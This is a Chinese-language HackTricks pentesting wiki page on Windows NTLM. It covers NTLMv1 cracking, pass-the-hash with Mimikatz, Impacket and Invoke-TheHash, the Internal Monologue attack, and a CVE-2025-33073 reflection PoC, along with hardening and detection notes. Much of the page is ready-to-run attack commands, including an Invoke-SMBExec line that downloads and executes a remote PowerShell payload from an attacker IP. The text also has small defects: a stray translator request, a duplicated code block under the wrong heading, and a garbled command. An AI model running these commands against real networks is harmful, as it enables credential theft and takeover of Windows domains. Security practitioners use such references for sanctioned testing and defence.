# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本信息

在运行 **Windows XP 和 Server 2003** 的环境中，会使用 LM（Lan Manager）哈希，尽管众所周知，这类哈希很容易被破解。特定的 LM 哈希 `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，对应空字符串的哈希。

默认情况下，**Kerberos** 身份验证协议是主要使用的方法。仅在特定情况下才会使用 NTLM（NT LAN Manager）：没有 Active Directory、域不存在、Kerberos 因配置不当而无法正常工作，或者使用 IP 地址而非有效主机名尝试建立连接时。

网络数据包中出现 **"NTLMSSP"** 标头，表示正在进行 NTLM 身份验证。

身份验证协议 LM、NTLMv1 和 NTLMv2 由位于 `%windir%\Windows\System32\msv1\_0.dll` 的特定 DLL 提供支持。

**要点**：

- LM 哈希存在漏洞，空 LM 哈希（`AAD3B435B51404EEAAD3B435B51404EE`）表示未使用 LM。
- Kerberos 是默认身份验证方法，只有在特定条件下才会使用 NTLM。
- 可以通过 "NTLMSSP" 标头识别 NTLM 身份验证数据包。
- 系统文件 `msv1\_0.dll` 支持 LM、NTLMv1 和 NTLMv2 协议。

## LM、NTLMv1 和 NTLMv2

你可以检查并配置要使用的协议：

### GUI

运行 _secpol.msc_ -> 本地策略 -> 安全选项 -> 网络安全：LAN Manager 身份验证级别。共有 6 个级别（从 0 到 5）。

![LM、NTLMv1 和 NTLMv2 - GUI：运行 secpol.msc - 本地策略 - 安全选项 - 网络安全：LAN Manager 身份验证级别。共有 6 个级别（从 0 到 5）](<../../images/image (919).png>)

### 注册表

这会将级别设置为 5：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

可能的值：

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## 基本 NTLM 域身份验证方案

1. **用户**输入自己的**凭据**
2. 客户端计算机**发送身份验证请求**，其中包含**域名**和**用户名**
3. **服务器**发送**质询**
4. **客户端使用密码哈希作为密钥加密**该**质询**，并将其作为响应发送
5. **服务器将**域名、用户名、质询和响应发送给**域控制器**。如果**未**配置 Active Directory，或者域名与服务器名称相同，则会在本地**检查凭据**。
6. **域控制器检查所有信息是否正确**，并将信息发送给服务器

**服务器**和**域控制器**可以通过 Netlogon 服务建立**安全通道**，因为域控制器知道服务器的密码（该密码保存在 **NTDS.DIT** 数据库中）。

### 本地 NTLM 身份验证方案

身份验证过程与**之前提到的**相同，**但**服务器在 **SAM** 文件中保存了尝试身份验证的**用户哈希**。因此，服务器不会向域控制器发出请求，而是会**自行检查**该用户是否可以通过身份验证。

### NTLMv1 质询

**质询长度为 8 字节**，**响应长度为 24 字节**。

**NT 哈希（16 字节）**分为**3 个部分，每部分 7 字节**（7B + 7B + (2B+0x00\*5)）：**最后一部分用零填充**。然后，分别使用每个部分对**质询**进行**加密**，再将**加密后的**字节拼接起来。总计：8B + 8B + 8B = 24 字节。

**问题**：

- 缺乏**随机性**
- 可以分别**攻击这 3 个部分**以找出 NT 哈希
- **DES 可以被破解**
- 第 3 个密钥始终由 **5 个零**组成。
- 给定**相同的质询**，得到的**响应**也会**相同**。因此，你可以向受害者发送字符串“**1122334455667788**”作为**质询**，然后使用**预计算的彩虹表**攻击其响应。

### NTLMv1 攻击

在现代环境中，非约束委派较少见，但仍可能滥用可访问的 **Print Spooler service**，诱使其向此类主机发起身份验证。

你可以滥用已经拥有的 AD 凭据/会话，**要求打印机向你控制的某台主机进行身份验证**。然后，使用 `metasploit auxiliary/server/capture/smb` 或 `responder` 将身份验证质询设置为 `1122334455667788`，捕获身份验证尝试；如果使用的是 **NTLMv1**，你就能**破解它**。\
如果使用 `responder`，可以尝试使用**标志 `--lm`**来尝试**降级**身份验证。\
_请注意，此技术要求使用 NTLMv1 进行身份验证（NTLMv2 不适用）。_

请记住，打印机在身份验证期间会使用计算机帐户，而计算机帐户使用的是**较长的随机密码**，你**可能无法**使用常见的**字典**破解这些密码。不过，**NTLMv1** 身份验证**使用 DES**（[更多信息请见此处](#ntlmv1-challenge)），因此可以使用专门用于破解 DES 的服务来破解它（例如 [https://crack.sh/](https://crack.sh) 或 [https://ntlmv1.com/](https://ntlmv1.com)）。

### 使用 hashcat 攻击 NTLMv1

也可以使用 [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) 攻击 NTLMv1。该工具会将捕获的 NTLMv1 消息转换为适用于 Hashcat 的格式。<sup>[[1]](#references)</sup>

命令是

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

将输出以下内容：

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

请提供需要翻译的英文内容。

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

运行 hashcat（最好通过 hashtopolis 之类的工具进行分布式处理），否则这可能需要数天。

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

在这种情况下，我们知道它的密码是 password，因此为了演示，我们就作弊一下：

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

现在我们需要使用 hashcat-utilities 将已破解的 DES 密钥转换为 NTLM 哈希的组成部分：

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

最后一部分：

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

将它们组合在一起：

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 挑战

**挑战长度为 8 字节**，并且会发送 **2 个响应**：一个长度为 **24 字节**，**另一个**长度**可变**。

**第一个响应**的生成方式是：使用 **HMAC_MD5** 对由**客户端和域**组成的**字符串**进行加密，并将 **NT hash** 的 **MD4 hash** 作为**密钥**。然后，将**结果**作为密钥，使用 **HMAC_MD5** 对**挑战**进行加密。再附加一个 8 字节的**客户端挑战值**。总计：24 B。

**第二个响应**使用**多个值**生成（新的客户端挑战值、用于防止**重放攻击**的**时间戳**等）。

如果你有一个**包含成功认证交换的 PCAP**，提取域、用户名、服务器挑战值和 NTLMv2 响应，按 Hashcat 的格式整理捕获数据，并使用模式 `5600` 尝试恢复密码。存档的实战演示保留了数据包字段提取步骤，而 Hashcat 的示例则定义了当前支持的格式。<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**获取受害者的 hash 后**，你就可以用它来**冒充**受害者。\
你需要使用一个**工具**，让它**使用该 hash 执行** **NTLM 认证**；或者，你可以创建一个新的 **sessionlogon**，并将该 **hash 注入** **LSASS**，这样每当执行 **NTLM 认证**时，就会使用该 **hash**。mimikatz 使用的就是最后一种方法。

**请记住，你也可以使用计算机账户执行 Pass-the-Hash 攻击。**

### **Mimikatz**

**需要以管理员身份运行**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

这会在当前本地用户下启动进程，同时 LSASS 会将提供的凭据关联到其出站网络登录。之后，你可以像使用 `runas /netonly` 一样，以所提供的用户身份访问网络资源，而无需知道明文密码。

### 从 Linux 执行 Pass-the-Hash

你可以从 Linux 对 Windows 机器执行 Pass-the-Hash，从而获得代码执行。\
[**查看 Pass-the-Hash 执行实战示例。**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows 编译工具

你可以在此处下载[适用于 Windows 的 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（在这种情况下，你需要指定一条命令；cmd.exe 和 powershell.exe 不能用于获取交互式 shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 还有其他多个 Impacket 二进制文件……

### Invoke-TheHash

你可以从这里获取 powershell 脚本：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

此函数结合了前述模式。你可以传入**多个主机**、排除选定的目标，并选择 _SMBExec、WMIExec、SMBClient_ 或 _SMBEnum_。如果选择 **SMBExec** 或 **WMIExec**，但未指定 _**Command**_ 参数，它只会检查你是否拥有足够的权限。

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**需要以管理员身份运行**

此工具会执行与 mimikatz 相同的操作（修改 LSASS 内存）。

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### 使用用户名和密码手动进行 Windows 远程执行


{{#ref}}
../lateral-movement/
{{#endref}}

## 从 Windows 主机提取凭据

更多信息请参见 [**窃取 Windows 凭据**](../stealing-credentials/README.md)。

## Internal Monologue attack

Internal Monologue Attack 是一种隐蔽的凭据提取技术，攻击者可以在**不直接与 LSASS 进程交互**的情况下，从受害者的计算机中获取 NTLM 哈希。与 Mimikatz 不同，Mimikatz 会直接读取内存中的哈希，因此经常被终端安全解决方案或 Credential Guard 拦截；此攻击则利用**通过安全支持提供程序接口 (SSPI) 对 NTLM 身份验证包 (MSV1_0) 进行本地调用**。攻击者首先**降低 NTLM 设置**（例如 LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic），以确保允许使用 NetNTLMv1。随后，他们冒充从正在运行的进程中获取的现有用户令牌，并在本地触发 NTLM 身份验证，以使用已知质询生成 NetNTLMv1 响应。<sup>[[4]](#references)</sup>

捕获这些 NetNTLMv1 响应后，攻击者可以使用**预计算的彩虹表**快速还原原始 NTLM 哈希，从而进一步通过 Pass-the-Hash 攻击进行横向移动。重要的是，Internal Monologue Attack 具有隐蔽性，因为它不会产生网络流量、注入代码或直接转储内存，因此相比 Mimikatz 等传统方法更难被防御者检测到。

如果由于强制执行的安全策略而不接受 NetNTLMv1，攻击者可能无法获取 NetNTLMv1 响应。

为应对这种情况，Internal Monologue 工具已更新：如果 NetNTLMv1 失败，它会通过 `AcceptSecurityContext()` 动态获取服务器令牌，仍可**捕获 NetNTLMv2 响应**。虽然 NetNTLMv2 更难破解，但在有限情况下，它仍可用于中继攻击或离线暴力破解。

PoC 位于 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**。<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**点击此处阅读有关如何执行这些攻击的详细指南：**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 从网络捕获中解析 NTLM 质询

**你可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## 通过序列化 SPN 进行 NTLM 和 Kerberos *Reflection* (CVE-2025-33073)

Windows 包含多种缓解措施，旨在阻止 *reflection* 攻击：这类攻击会将源自某台主机的 NTLM（或 Kerberos）身份验证中继回**同一台**主机，以获取 SYSTEM 权限。

Microsoft 通过 MS08-068（SMB→SMB）、MS09-013（HTTP→SMB）、MS15-076（DCOM→DCOM）及后续补丁破坏了大多数公开攻击链。不过，**CVE-2025-33073** 表明，攻击者仍能利用 **SMB 客户端截断包含 *marshalled*（序列化）目标信息的服务主体名称 (SPN)** 这一行为绕过保护。<sup>[[5]](#references)[[6]](#references)</sup>

### 漏洞概要
1. 攻击者注册一个 **DNS A 记录**，其标签编码了一个 marshalled SPN，例如：
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 诱使受害者向该主机名进行身份验证（PetitPotam、DFSCoerce 等）。
3. 当 SMB 客户端将目标字符串 `cifs/srv11UWhRCAAAAA…` 传递给 `lsasrv!LsapCheckMarshalledTargetInfo` 时，对 `CredUnmarshalTargetInfo` 的调用会**剥除**序列化数据，留下 **`cifs/srv1`**。
4. 此时，`msv1_0!SspIsTargetLocalhost`（或对应的 Kerberos 函数）会将目标判定为 *localhost*，因为短主机名部分与计算机名称 (`SRV1`) 匹配。
5. 因此，服务器会设置 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，并将 **LSASS 的 SYSTEM 访问令牌**注入上下文（对于 Kerberos，则会创建带有 SYSTEM 标记的子会话密钥）。
6. 使用 `ntlmrelayx.py` **或** `krbrelayx.py` 中继该身份验证，即可在同一台主机上获得完整的 SYSTEM 权限。<sup>[[5]](#references)</sup>

### 快速 PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### 补丁与缓解措施
* KB 补丁针对 **CVE-2025-33073**，在 `mrxsmb.sys::SmbCeCreateSrvCall` 中添加检查，阻止目标包含 marshalled info 的任何 SMB 连接（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）。<sup>[[5]](#references)[[6]](#references)</sup>
* 在 SMB relay 目标上强制启用 **SMB signing**。对于其他目标，应评估该协议自身的 signing 或 Extended Protection 要求以及补丁级别；仅启用 SMB signing 并不能确定能否进行 HTTPS WinRM relay。
* 监控类似 `*<base64>...*` 的 DNS 记录，并阻止 coercion 向量（PetitPotam、DFSCoerce、AuthIP...）。

### 检测思路
* 网络捕获中出现 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，且客户端 IP ≠ 服务器 IP。
* Kerberos AP-REQ 包含 subsession key，且客户端 principal 等于主机名。
* Windows Event 4624/4648 SYSTEM 登录后，紧接着出现来自同一主机的远程 SMB 写入。<sup>[[5]](#references)</sup>

序列化的 target-information DNS 名称也可以将被 coercion 的身份验证引向攻击者，以便对 AD CS web-enrollment 端点进行 **cross-protocol relay**。这与同主机 reflection 是不同的结果：必须分别评估 [ESC8 enrollment 条件](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)、DNS 写入权限、coercion 路径以及目标的补丁级别。

有关利用 **SMB 任意端口**和 **TCP 连接重用**获取 `NT AUTHORITY\SYSTEM` 的 **2026 年 3 月**本地 reflection 变体，请参见：

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 多功能工具](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat 示例哈希 – NetNTLMv2（模式 5600）](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash 工具](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue 攻击：不接触 LSASS 获取 NTLM 哈希](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection 已死，NTLM Reflection 万岁！](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [破解 NTLMv2 哈希 – 801Labs（Internet Archive）](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
